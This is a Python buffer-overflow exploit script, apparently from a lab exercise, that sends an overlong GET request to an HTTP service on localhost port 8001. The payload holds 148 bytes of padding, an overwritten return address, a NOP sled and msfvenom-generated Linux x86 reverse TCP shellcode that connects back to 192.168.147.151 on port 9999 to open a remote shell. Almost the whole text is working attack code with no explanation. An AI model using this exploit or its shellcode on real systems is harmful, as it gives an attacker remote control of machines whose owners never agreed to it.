import socket
import struct

# --------------------------------------------------
# Payload layout
# --------------------------------------------------

# Offset to EIP
junk = b"A" * 148

# Return address (ESP / stack address)
# This address points back into our buffer
rip = struct.pack("<I", 0xffffcc70)

# NOP sled
nops = b"\x90" * 32

# --------------------------------------------------
# Shellcode
# linux/x86 reverse_tcp
# LHOST=192.168.147.151
# LPORT=9999
# Bad chars removed: \x00\x0a\x0d
#
# msfvenom -p linux/x86/shell_reverse_tcp \
# LHOST=192.168.147.151 LPORT=9999 \
# -b \"\\x00\\x0a\\x0d\" -f py
# --------------------------------------------------

scode  = b""
scode += b"\xbc\x1c\xfb\x27\xdb\xd0\xd9\x74\x24\xf4\x5a"
scode += b"\x31\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\xce"
scode += b"\x12\x19\xd2\x1f\xf0\x2a\xfe\x0c\x45\x86\x6b\xb0"
scode += b"\xc0\xc9\xdc\xd2\x1f\x89\x8e\x43\x10\xb5\x7d\xf3"
scode += b"\x19\xb3\x84\x9b\x59\xeb\xb2\xda\x32\xee\x3c\xfb"
scode += b"\xcd\x67\xdd\xb3\xb4\x27\x4f\xe0\x8b\xcb\xec\xe7"
scode += b"\x21\x4b\xaa\x8f\xd7\x63\x38\x27\x40\x53\x91\xbd"
scode += b"\xf9\x22\x0e\x4b\xa9\xbd\x30\xdb\x46\x73\x32"

# --------------------------------------------------
# Build final payload
# --------------------------------------------------

payload = junk + rip + nops + scode

# --------------------------------------------------
# Send exploit
# --------------------------------------------------

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8001))

request  = b"GET /" + payload + b" HTTP/1.1\r\n"
request += b"Host: localhost:8001\r\n"
request += b"\r\n"

sock.send(request)
sock.recv(4096)
sock.close()
